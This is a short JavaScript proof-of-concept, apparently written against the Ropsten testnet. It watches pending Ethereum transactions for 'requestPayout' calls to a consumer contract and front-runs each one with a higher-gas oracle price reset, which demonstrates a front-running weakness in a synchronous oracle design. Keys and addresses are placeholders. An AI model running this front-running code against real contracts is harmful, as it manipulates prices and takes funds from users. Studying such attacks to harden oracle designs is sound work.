const Web3 = require("web3")
const abiDecoder = require("abi-decoder")

const CONSUMER_ABI = require("./build/contracts/SynchronousConsumer.json").abi
const ORACLE_ABI = require("./build/contracts/SynchronousOracle.json").abi
abiDecoder.addABI(CONSUMER_ABI)

const web3 = new Web3(new Web3.providers.HttpProvider(("https://ropsten.infura.io/v3/<INFURA_API_KEY>")))
const wss3 = new Web3(new Web3.providers.WebsocketProvider("wss://ropsten.infura.io/ws/"))

const ORACLE_KEY = "<ORACLE_PRIVATE_KEY>"
const CONSUMER_CONTRACT_ADDRESS = "<CONSUMER_CONTRACT_ADDRESS_ALL_UPPER_CASE>"
const ORACLE_CONTRACT_ADDRESS = "<ORACLE_CONTRACT_ADDRESS_ALL_UPPER_CASE>"
const ORACLE_ADDRESS = "<ORACLE_ADDRESS_ALL_UPPER_CASE>"

const oracleContract = new web3.eth.Contract(ORACLE_ABI, ORACLE_CONTRACT_ADDRESS)

const RESET_ORACLE = oracleContract.methods.update(11).encodeABI()

wss3.eth.subscribe("pendingTransactions").on("data", transactionHash => {
  wss3.eth.getTransaction(transactionHash).then(transaction => {
    if (isPending(transaction) && isRelevantContract(transaction.to) && isRelevantMethod(transaction.input)) {
      console.log("front-running !")
      updatePrice(transaction.gasPrice)
    }
  })
})

const isPending = (transaction) =>
  transaction && transaction.blockNumber == null

const isRelevantContract = (toAddress) =>
  toAddress && toAddress.toUpperCase() === CONSUMER_CONTRACT_ADDRESS

const isRelevantMethod = (transactionInput) =>
  abiDecoder.decodeMethod(transactionInput).name === "requestPayout"

async function updatePrice (transactionGas) {
  const tx = {
    to: ORACLE_CONTRACT_ADDRESS,
    data: RESET_ORACLE,
    from: ORACLE_ADDRESS,
    gas: 30000,
    gasPrice: parseInt(transactionGas) + Math.pow(10, 9)
  }
  const signedRequest = await web3.eth.accounts.signTransaction(tx, "0x" + ORACLE_KEY)
  await web3.eth.sendSignedTransaction(signedRequest.rawTransaction)
}

// Keep the program alive
(function wait () {
  setTimeout(wait, 999999999)
})()
